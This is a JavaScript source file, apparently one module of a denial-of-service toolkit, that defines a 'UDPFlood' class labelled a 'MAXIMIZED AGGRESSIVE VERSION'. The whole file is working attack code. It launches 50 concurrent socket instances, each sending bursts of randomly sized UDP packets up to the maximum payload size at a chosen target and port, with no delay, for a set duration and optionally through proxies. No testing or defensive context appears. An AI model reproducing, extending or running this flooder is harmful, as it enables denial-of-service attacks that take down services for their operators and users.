import dgram from 'dgram';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { StatsTracker } from '../../utils/stats-tracker.js';

/**
 * UDP Flood Attack - MAXIMIZED AGGRESSIVE VERSION
 */
export class UDPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
        
        // Stats tracking for monitor
        this.statsTracker = new StatsTracker();
        this.stats = this.statsTracker.stats;
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            while (Date.now() < endTime && this.active) {
                try {
                    // Launch 50 simultaneous UDP flood instances
                    const floods = [];
                    for (let i = 0; i < 50; i++) {
                        floods.push(this.attack());
                    }
                    await Promise.allSettled(floods);
                } catch (err) {
                    logger.debug(`UDP flood iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`UDP Flood error: ${err.message}`);
            this.active = false;
        }
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const socket = dgram.createSocket('udp4');
                
                try {
                    socket.setRecvBufferSize(65536);
                    socket.setSendBufferSize(65536);
                } catch (err) {
                    logger.debug(`Socket buffer config error: ${err.message}`);
                }
                
                let packetsSent = 0;
                const maxPackets = 10000; // 10k packets per instance

                const sendBurst = () => {
                    if (!this.active || packetsSent >= maxPackets) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    try {
                        // Send 1000 packets per burst with varying sizes
                        for (let i = 0; i < 1000; i++) {
                            if (!this.active) break;
                            
                            try {
                                // Vary payload sizes for maximum impact
                                const payloadSize = Tools.randomInt(512, 65507); // Up to max UDP size
                                const payload = Tools.randomBytesBuffer(payloadSize);
                                
                                Tools.sendTo(socket, payload, this.port, this.target);
                                REQUESTS_SENT.add(1);
                                BYTES_SENT.add(payloadSize);
                                this.statsTracker.addRequest(true, payloadSize);
                                packetsSent++;
                            } catch (err) {
                                // Continue on individual packet error
                            }
                        }
                    } catch (err) {
                        logger.debug(`UDP burst error: ${err.message}`);
                    }

                    // Continue immediately without delay
                    setImmediate(sendBurst);
                };

                socket.on('error', (err) => {
                    logger.debug(`UDP socket error: ${err.message}`);
                    Tools.safeClose(socket);
                    resolve();
                });

                sendBurst();

                // Auto cleanup after 3 seconds
                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 3000);
            } catch (err) {
                logger.debug(`UDP attack error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}
